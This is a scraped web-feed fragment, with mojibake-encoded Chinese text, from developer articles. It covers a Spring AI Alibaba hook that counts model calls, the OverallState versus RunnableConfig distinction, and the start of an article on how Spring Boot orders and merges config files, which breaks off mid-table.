<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ModelCallCounterHook</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ModelHook</span> {  
  
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CALL_COUNT_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">"__model_call_count__"</span>;  
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOTAL_TIME_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">"__total_model_time__"</span>;  
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">START_TIME_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">"__call_start_time__"</span>;  
  
<span class="hljs-meta">@Override</span>  
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {  
<span class="hljs-keyword">return</span> <span class="hljs-string">"model_call_counter"</span>;  
}  
  
<span class="hljs-meta">@Override</span>  
<span class="hljs-keyword">public</span> CompletableFuture&lt;Map&lt;String, Object&gt;&gt; <span class="hljs-title function_">beforeModel</span><span class="hljs-params">(OverAllState state, RunnableConfig config)</span> {  
<span class="hljs-comment">// ä» context è¯»å–å½“å‰è®¡æ•°ï¼ˆå¦‚æœä¸å­˜åœ¨åˆ™é»˜è®¤ä¸º 0ï¼‰  </span>
<span class="hljs-type">int</span> <span class="hljs-variable">currentCount</span> <span class="hljs-operator">=</span> config.context().containsKey(CALL_COUNT_KEY)  
? (<span class="hljs-type">int</span>) config.context().get(CALL_COUNT_KEY) : <span class="hljs-number">0</span>;  
  
System.out.println(<span class="hljs-string">"æ¨¡å‹è°ƒç”¨ #"</span> + (currentCount + <span class="hljs-number">1</span>));  
  
<span class="hljs-comment">// è®°å½•å¼€å§‹æ—¶é—´  </span>
config.context().put(START_TIME_KEY, System.currentTimeMillis());  
  
<span class="hljs-keyword">return</span> CompletableFuture.completedFuture(Map.of());  
}  
  
<span class="hljs-meta">@Override</span>  
<span class="hljs-keyword">public</span> CompletableFuture&lt;Map&lt;String, Object&gt;&gt; <span class="hljs-title function_">afterModel</span><span class="hljs-params">(OverAllState state, RunnableConfig config)</span> {  
<span class="hljs-comment">// è¯»å–å½“å‰è®¡æ•°å¹¶é€’å¢  </span>
<span class="hljs-type">int</span> <span class="hljs-variable">currentCount</span> <span class="hljs-operator">=</span> config.context().containsKey(CALL_COUNT_KEY)  
? (<span class="hljs-type">int</span>) config.context().get(CALL_COUNT_KEY) : <span class="hljs-number">0</span>;  
config.context().put(CALL_COUNT_KEY, currentCount + <span class="hljs-number">1</span>);  
  
<span class="hljs-comment">// è®¡ç®—æœ¬æ¬¡è°ƒç”¨è€—æ—¶å¹¶ç´¯åŠ åˆ°æ€»è€—æ—¶  </span>
<span class="hljs-keyword">if</span> (config.context().containsKey(START_TIME_KEY)) {  
<span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> (<span class="hljs-type">long</span>) config.context().get(START_TIME_KEY);  
<span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - startTime;  
  
<span class="hljs-type">long</span> <span class="hljs-variable">totalTime</span> <span class="hljs-operator">=</span> config.context().containsKey(TOTAL_TIME_KEY)  
? (<span class="hljs-type">long</span>) config.context().get(TOTAL_TIME_KEY) : <span class="hljs-number">0L</span>;  
config.context().put(TOTAL_TIME_KEY, totalTime + duration);  
  
<span class="hljs-comment">// è¾“å‡ºç»Ÿè®¡ä¿¡æ¯  </span>
<span class="hljs-type">int</span> <span class="hljs-variable">newCount</span> <span class="hljs-operator">=</span> currentCount + <span class="hljs-number">1</span>;  
<span class="hljs-type">long</span> <span class="hljs-variable">newTotalTime</span> <span class="hljs-operator">=</span> totalTime + duration;  
System.out.println(<span class="hljs-string">"æ¨¡å‹è°ƒç”¨å®Œæˆ: "</span> + duration + <span class="hljs-string">"ms"</span>);  
System.out.println(<span class="hljs-string">"ç´¯è®¡ç»Ÿè®¡ - è°ƒç”¨æ¬¡æ•°: "</span> + newCount + <span class="hljs-string">", æ€»è€—æ—¶: "</span> + newTotalTime + <span class="hljs-string">"ms, å¹³å‡: "</span> + (newTotalTime / newCount) + <span class="hljs-string">"ms"</span>);  
}  
  
<span class="hljs-keyword">return</span> CompletableFuture.completedFuture(Map.of());  
}  
}
</code></pre>
<h2 data-id="heading-7">OverallState (å…¨å±€çŠ¶æ€/ä¸Šä¸‹æ–‡)</h2>
<p><code>OverallState</code> é€šå¸¸ä¸æ˜¯ Spring AI æ¡†æ¶å†…çš„ä¸€ä¸ªå›ºå®šç±»åï¼ˆä¸åƒ <code>RunnableConfig</code> å±äºæ ¸å¿ƒæ¥å£ï¼‰ï¼Œå®ƒé€šå¸¸æ˜¯å¼€å‘è€…åœ¨æ„å»º <strong>åŸºäºå›¾ï¼ˆGraph-basedï¼‰</strong> æˆ– <strong>çŠ¶æ€æœºï¼ˆStatefulï¼‰</strong> çš„ Agent æ—¶è‡ªå®šä¹‰çš„ä¸€ä¸ªç±»ã€‚</p>
<p>åœ¨ Spring AI Alibaba çš„é«˜çº§åº”ç”¨ï¼ˆå¦‚ä»¿ç…§ LangGraph çš„æ¨¡å¼ï¼‰ä¸­ï¼ŒAgent çš„æ‰§è¡Œè¿‡ç¨‹è¢«è§†ä¸ºä¸€ç³»åˆ—èŠ‚ç‚¹çš„æµè½¬ã€‚<code>OverallState</code> å°±æ˜¯åœ¨è¿™äº›èŠ‚ç‚¹ä¹‹é—´ä¼ é€’çš„<strong>å…±äº«å†…å­˜å¯¹è±¡</strong>ã€‚</p>
<p>å®ƒä¸€èˆ¬åŒ…å«çš„å°±æ˜¯åº”ç”¨çš„ä¸šåŠ¡æ•°æ®ã€‚</p>
<h3 data-id="heading-8">æ ¸å¿ƒä½œç”¨ï¼š</h3>
<ol>
<li>
<p><strong>ç»Ÿä¸€çš„æ•°æ®æ€»çº¿</strong>ï¼š</p>
<ul>
<li>æ‰€æœ‰çš„èŠ‚ç‚¹ï¼ˆNodeï¼‰éƒ½ä» <code>OverallState</code> è¯»å–æ•°æ®ï¼Œå¤„ç†å®Œåå°†ç»“æœå†™å› <code>OverallState</code>ã€‚</li>
</ul>
</li>
<li>
<p><strong>è®°å¿†ç®¡ç† (Memory)</strong> ï¼š</p>
<ul>
<li>
<p>å®ƒé€šå¸¸åŒ…å«ï¼š</p>
<ul>
<li><code>input</code>ï¼šç”¨æˆ·çš„åŸå§‹é—®é¢˜ã€‚</li>
<li><code>chat_history</code>ï¼šå¯¹è¯çš„å†å²æ¶ˆæ¯åˆ—è¡¨ã€‚</li>
<li><code>intermediate_steps</code>ï¼šAgent çš„ä¸­é—´æ€è€ƒè¿‡ç¨‹æˆ–å·¥å…·è°ƒç”¨ç»“æœã€‚</li>
<li><code>output</code>ï¼šæœ€ç»ˆç”Ÿæˆçš„ç­”æ¡ˆã€‚</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>çŠ¶æ€æµè½¬</strong>ï¼š</p>
<ul>
<li>åœ¨ Spring AI Alibaba å¯¹æ¥ Qwenï¼ˆé€šä¹‰åƒé—®ï¼‰æ—¶ï¼Œæ¨¡å‹ç”Ÿæˆçš„å›å¤ä¼šæ›´æ–°åˆ° State ä¸­ï¼Œä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆæ¯”å¦‚å·¥å…·æ‰§è¡ŒèŠ‚ç‚¹ï¼‰ä¼šè¯»å– State ä¸­çš„æ¨¡å‹æŒ‡ä»¤å»æ‰§è¡Œå·¥å…·ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-9">å·¥ä½œæµ</h3>
<p>ä¸‹é¢æˆ‘ç»™å‡ºä¸€ä¸ªç¤ºä¾‹å·¥ä½œæµã€‚</p>
<ul>
<li>
<p><strong>Start</strong> -&gt; ä¼ å…¥åˆå§‹ <code>OverallState</code>ï¼ˆåŒ…å«ç”¨æˆ·é—®é¢˜ï¼‰ã€‚</p>
</li>
<li>
<p><strong>LLM Node</strong> -&gt; è¯»å– Stateï¼Œè°ƒç”¨ Qwen æ¨¡å‹ï¼Œå°†æ¨¡å‹çš„å›å¤ï¼ˆæ¯”å¦‚â€œå»è°ƒç”¨å¤©æ°”APIâ€ï¼‰å†™å…¥ Stateã€‚</p>
</li>
<li>
<p><strong>Tool Node</strong> -&gt; æ£€æµ‹åˆ° State é‡Œæœ‰è°ƒç”¨è¯·æ±‚ï¼Œæ‰§è¡Œå¤©æ°” APIï¼Œå°†ç»“æœâ€œ25åº¦â€å†™å…¥ Stateã€‚</p>
</li>
<li>
<p><strong>LLM Node</strong> -&gt; å†æ¬¡è¯»å– Stateï¼ˆåŒ…å«é—®é¢˜+å·¥å…·ç»“æœï¼‰ï¼Œç”Ÿæˆæœ€ç»ˆå›ç­”â€œä»Šå¤©25åº¦â€ï¼Œå†™å…¥ Stateã€‚</p>
</li>
<li>
<p><strong>End</strong> -&gt; è¿”å› State ä¸­çš„æœ€ç»ˆå›ç­”ã€‚</p>
</li>
</ul>
<h2 data-id="heading-10">æ€»ç»“å¯¹æ¯”</h2>






























<table><thead><tr><th><strong>ç‰¹æ€§</strong></th><th><strong>RunnableConfig</strong></th><th><strong>OverallState (è‡ªå®šä¹‰çŠ¶æ€)</strong></th></tr></thead><tbody><tr><td><strong>å…³æ³¨ç‚¹</strong></td><td><strong>è¿‡ç¨‹æ§åˆ¶</strong> (Process Control)</td><td><strong>ä¸šåŠ¡æ•°æ®</strong> (Business Data)</td></tr><tr><td><strong>å†…å®¹ç¤ºä¾‹</strong></td><td>é€’å½’é™åˆ¶ã€å›è°ƒå‡½æ•°ã€å…ƒæ•°æ®ã€æ ‡ç­¾</td><td>ç”¨æˆ·é—®é¢˜ã€LLM å›å¤ã€å·¥å…·ç»“æœã€æ•°æ®åº“æŸ¥è¯¢å€¼</td></tr><tr><td><strong>å¯å˜æ€§</strong></td><td>é€šå¸¸åœ¨è¿è¡Œå¼€å§‹æ—¶è®¾å®šï¼Œä¼ é€’è¿‡ç¨‹ä¸­è¾ƒå°‘ä¿®æ”¹</td><td>åœ¨æ¯ä¸ªæ­¥éª¤ï¼ˆNodeï¼‰ä¸­ä¸æ–­è¢«è¯»å–å’Œä¿®æ”¹ï¼ˆç´¯åŠ ä¿¡æ¯ï¼‰</td></tr><tr><td><strong>ç±»æ¯”</strong></td><td><strong>äº¤é€šè§„åˆ™ä¸ä¿¡å·ç¯</strong>ï¼ˆçº¢ç»¿ç¯ã€é™é€Ÿï¼‰</td><td><strong>è´§è½¦ä¸Šçš„è´§ç‰©</strong>ï¼ˆæ¯ä¸€ç«™å¯èƒ½ä¼šè£…å¸è´§ç‰©ï¼‰</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot é…ç½®æ–‡ä»¶åŠ è½½å¤§æ­ç§˜ï¼šä¼˜å…ˆçº§è¦†ç›–ä¸äº’è¡¥åˆå¹¶æœºåˆ¶è¯¦è§£]]></title>    <link>https://juejin.cn/post/7592572266754342975</link>    <guid>https://juejin.cn/post/7592572266754342975</guid>    <pubDate>2026-01-08T08:22:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592572266754342975" data-draft-id="7592637149696655395" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot é…ç½®æ–‡ä»¶åŠ è½½å¤§æ­ç§˜ï¼šä¼˜å…ˆçº§è¦†ç›–ä¸äº’è¡¥åˆå¹¶æœºåˆ¶è¯¦è§£"/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2026-01-08T08:22:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·030480591263"/> <meta itemprop="url" content="https://juejin.cn/user/3793762867478852"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot é…ç½®æ–‡ä»¶åŠ è½½å¤§æ­ç§˜ï¼šä¼˜å…ˆçº§è¦†ç›–ä¸äº’è¡¥åˆå¹¶æœºåˆ¶è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3793762867478852/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·030480591263
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:22:28.000Z" title="Thu Jan 08 2026 08:22:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ Spring Boot é¡¹ç›®çš„éƒ¨ç½²è¿ç»´ä¸­ï¼ˆå°¤å…¶æ˜¯ä½¿ç”¨ <code>java -jar</code> å¯åŠ¨æ—¶ï¼‰ï¼Œé…ç½®æ–‡ä»¶çš„åŠ è½½é€»è¾‘å¸¸å¸¸è®©äººæ„Ÿåˆ°å›°æƒ‘ï¼š</p>
<blockquote>
<p>â€œå¦‚æœæˆ‘åœ¨ jar åŒ…æ—è¾¹æ”¾äº†é…ç½®æ–‡ä»¶ï¼Œconfig ç›®å½•ä¸‹ä¹Ÿæ”¾äº†ä¸€ä¸ªï¼Œjar åŒ…é‡Œè¿˜æœ‰ä¸€ä¸ªï¼Œåˆ°åº•è°ç”Ÿæ•ˆï¼Ÿâ€
â€œå¤–éƒ¨é…ç½®æ–‡ä»¶æ˜¯ä¼šæŠŠå†…éƒ¨çš„å®Œå…¨æ›¿æ¢æ‰å—ï¼Ÿâ€</p>
</blockquote>
<p>ä»Šå¤©æˆ‘ä»¬å°±é€šè¿‡ä¸€ç¯‡æ–‡ç« ï¼Œå½»åº•è®²é€ Spring Boot é…ç½®æ–‡ä»¶çš„ <strong>â€œä¼˜å…ˆçº§è¦†ç›–â€</strong> ä¸ <strong>â€œäº’è¡¥åˆå¹¶â€</strong> ä¸¤å¤§æ ¸å¿ƒæœºåˆ¶ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ æ ¸å¿ƒæœºåˆ¶å›¾è§£</h2>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦å»ºç«‹ä¸€ä¸ªæ¦‚å¿µï¼šSpring Boot è¯»å–é…ç½®ï¼Œ<strong>ä¸æ˜¯â€œéé»‘å³ç™½â€çš„æ–‡ä»¶æ›¿æ¢ï¼Œè€Œæ˜¯ç±»ä¼¼â€œåƒå±‚é¥¼â€æˆ–â€œPSå›¾å±‚â€çš„å åŠ ã€‚</strong></p>
<p>å®ƒéµå¾ªä¸¤ä¸ªåŸåˆ™ï¼š</p>
<ol>
<li><strong>ä¼˜å…ˆçº§ï¼ˆPriorityï¼‰ï¼š</strong> å†³å®šè°è¯´äº†ç®—ï¼ˆé‡åˆ°å†²çªï¼Œå¬é«˜ä¼˜å…ˆçº§çš„ï¼‰ã€‚</li>
<li><strong>äº’è¡¥åˆå¹¶ï¼ˆMergeï¼‰ï¼š</strong> å†³å®šå¦‚ä½•å…±å­˜ï¼ˆæ²¡å†²çªçš„ï¼Œå¤§å®¶ä¸€èµ·ç”Ÿæ•ˆï¼‰ã€‚</li>
</ol>
<h2 data-id="heading-1">äºŒã€ ä¼˜å…ˆçº§æ¢¯é˜Ÿï¼ˆè°æ˜¯è€å¤§ï¼Ÿï¼‰</h2>
<p>å½“ç¨‹åºå¯åŠ¨æ—¶ï¼ŒSpring Boot ä¼šæŒ‰ç…§ä»¥ä¸‹é¡ºåºæ‰«æé…ç½®æ–‡ä»¶ï¼Œ<strong>ä¼˜å…ˆçº§ä»é«˜åˆ°ä½</strong>ï¼š</p>
<ol>
<li><strong>å‘½ä»¤è¡Œå‚æ•°</strong> <code>(æœ€é«˜)</code>
<ul>
<li><code>java -jar app.jar --server.port=9999</code></li>
<li><em>è¯´æ˜ï¼š</em> ä¸€ç¥¨å¦å†³æƒï¼Œé€šå¸¸ç”¨äºä¸´æ—¶æ•‘æ€¥ã€‚</li>
</ul>
</li>
<li><strong>è¿è¡Œç›®å½•ä¸‹çš„ config å­ç›®å½•</strong>
<ul>
<li><code>file:./config/application.yml</code></li>
<li><em>è¯´æ˜ï¼š</em> å¤–éƒ¨é…ç½®çš„ç‹è€…ï¼Œä¼˜å…ˆçº§é«˜äºæ ¹ç›®å½•ã€‚</li>
</ul>
</li>
<li><strong>è¿è¡Œç›®å½•ï¼ˆJar åŒ…åŒçº§ç›®å½•ï¼‰</strong>
<ul>
<li><code>file:./application.yml</code></li>
<li><em>è¯´æ˜ï¼š</em> æœ€å¸¸ç”¨çš„ç”Ÿäº§ç¯å¢ƒé…ç½®ä½ç½®ã€‚</li>
</ul>
</li>
<li><strong>Classpath å†…éƒ¨</strong> <code>(æœ€ä½/ä¿åº•)</code>
<ul>
<li><code>classpath:/application.yml</code></li>
<li><em>è¯´æ˜ï¼š</em> æ‰“åŒ…åœ¨ Jar åŒ…é‡Œçš„é»˜è®¤é…ç½®ï¼ˆå¼€å‘æ—¶å†™çš„ï¼‰ã€‚</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€ äº’è¡¥åˆå¹¶æœºåˆ¶ï¼ˆå¦‚ä½•å…±å­˜ï¼Ÿï¼‰</h2>
<p>è¿™æ˜¯å¾ˆå¤šæ–°æ‰‹å®¹æ˜“è¯¯è§£çš„åœ°æ–¹ã€‚</p>
<p><strong>å¤–éƒ¨é…ç½®æ–‡ä»¶ç”Ÿæ•ˆï¼Œå¹¶ä¸ä»£è¡¨å†…éƒ¨é…ç½®æ–‡ä»¶â€œå¤±æ•ˆâ€æˆ–â€œè¢«ä¸¢å¼ƒâ€ï¼</strong>
Spring Boot ä¼šæŠŠæ‰€æœ‰æ‰«æåˆ°çš„é…ç½®æ–‡ä»¶<strong>åŠ è½½è¿›å†…å­˜è¿›è¡Œåˆå¹¶</strong>ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆ <strong>Photoshop çš„å›¾å±‚å åŠ </strong>ï¼š</p>
<ul>
<li>é«˜ä¼˜å…ˆçº§çš„é…ç½®åœ¨<strong>ä¸Šå±‚</strong>ã€‚</li>
<li>ä½ä¼˜å…ˆçº§çš„é…ç½®åœ¨<strong>ä¸‹å±‚</strong>ã€‚</li>
<li>å¦‚æœä¸Šå±‚æ²¡æœ‰è®¾ç½®æŸä¸ªå€¼ï¼ˆé€æ˜ï¼‰ï¼Œå°±ä¼šé€è¿‡ä¸Šå±‚çœ‹åˆ°ä¸‹å±‚çš„å€¼ã€‚</li>
</ul>
<h3 data-id="heading-3">å åŠ è§„åˆ™çš„ä¸‰å¤§å®šå¾‹ï¼š</h3>
<ol>
<li><strong>å†²çªè¦†ç›–ï¼ˆOverrideï¼‰ï¼š</strong> Key ç›¸åŒï¼Œé«˜ä¼˜å…ˆçº§è¦†ç›–ä½ä¼˜å…ˆçº§ã€‚</li>
<li><strong>ç¼ºçœä¿ç•™ï¼ˆRetainï¼‰ï¼š</strong> Key ä»…åœ¨ä½ä¼˜å…ˆçº§å­˜åœ¨ï¼Œä¼šè¢«ä¿ç•™ã€‚</li>
<li><strong>å¢é‡è¿½åŠ ï¼ˆAddï¼‰ï¼š</strong> Key ä»…åœ¨é«˜ä¼˜å…ˆçº§å­˜åœ¨ï¼Œä¼šè¢«è¿½åŠ ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-4">å››ã€ ç»ˆæå®æˆ˜æ¼”ç»ƒ</h2>
<p>ä¸ºäº†å½»åº•çœ‹æ‡‚ï¼Œæˆ‘ä»¬å‡è®¾æœ‰ä¸‰ä¸ªé…ç½®æ–‡ä»¶åŒæ—¶å­˜åœ¨ï¼š</p>
<h4 data-id="heading-5">1. å±‚çº§æœ€ä½ï¼šJar åŒ…å†…éƒ¨ (<code>classpath</code>)</h4>
<p>è¿™æ˜¯å¼€å‘æ—¶çš„å…¨é‡é…ç½®ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span>             <span class="hljs-comment"># é»˜è®¤ç«¯å£</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">my-app</span>         <span class="hljs-comment"># åº”ç”¨å</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost/dev_db</span> <span class="hljs-comment"># å¼€å‘åº“</span>
</code></pre>
<h4 data-id="heading-6">2. å±‚çº§ä¸­ç­‰ï¼šJar åŒ…åŒçº§ç›®å½• (<code>./application.yml</code>)</h4>
<p>è¿ç»´éƒ¨ç½²æ—¶æ”¾çš„ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9000</span>             <span class="hljs-comment"># ã€å†²çªã€‘æƒ³æ”¹æˆ 9000</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://192.168.1.1/prod_db</span> <span class="hljs-comment"># ã€å†²çªã€‘æ”¹æˆç”Ÿäº§åº“</span>
</code></pre>
<h4 data-id="heading-7">3. å±‚çº§æœ€é«˜ï¼šConfig å­ç›®å½• (<code>./config/application.yml</code>)</h4>
<p>ä¸ºäº†ç‰¹æ®Šè°ƒè¯•ï¼ŒåˆåŠ äº†ä¸€ä¸ªï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9999</span>             <span class="hljs-comment"># ã€å†²çªã€‘è¿™é‡Œçº§åˆ«æœ€é«˜ï¼</span>
<span class="hljs-attr">logging:</span>
  <span class="hljs-attr">level:</span> <span class="hljs-string">debug</span>           <span class="hljs-comment"># ã€æ–°å¢ã€‘è¿™é‡Œç‹¬æœ‰çš„é…ç½®</span>
</code></pre>
<hr/>
<h3 data-id="heading-8">ğŸ’¥ æœ€ç»ˆåˆå¹¶ç»“æœï¼ˆç¨‹åºå®é™…è¿è¡Œé…ç½®ï¼‰</h3>
<p>å½“è¿è¡Œ <code>java -jar app.jar</code> æ—¶ï¼Œæœ€ç»ˆç”Ÿæ•ˆçš„é…ç½®å¦‚ä¸‹ï¼š</p>






























<table><thead><tr><th align="left">é…ç½®é¡¹ (Key)</th><th align="left">æœ€ç»ˆå€¼</th><th align="left">æ¥æºä¸åŸå› </th></tr></thead><tbody><tr><td align="left"><code>server.port</code></td><td align="left"><strong>9999</strong></td><td align="left"><strong>configç›®å½•</strong> (æœ€é«˜ä¼˜) è¦†ç›–äº† jaråŒ…æ— å’Œ jaråŒ…å†… çš„é…ç½®ã€‚</td></tr><tr><td align="left"><code>spring.datasource.url</code></td><td align="left"><strong>.../prod_db</strong></td><td align="left"><strong>jaråŒ…æ—ç›®å½•</strong> (ä¸­ä¼˜) è¦†ç›–äº† jaråŒ…å†… çš„é…ç½®ï¼Œconfigç›®å½•æ²¡å†™ï¼Œæ‰€ä»¥â€œé€â€ä¸‹æ¥äº†ã€‚</td></tr><tr><td align="left"><code>spring.application.name</code></td><td align="left"><strong>my-app</strong></td><td align="left"><strong>jaråŒ…å†…éƒ¨</strong> 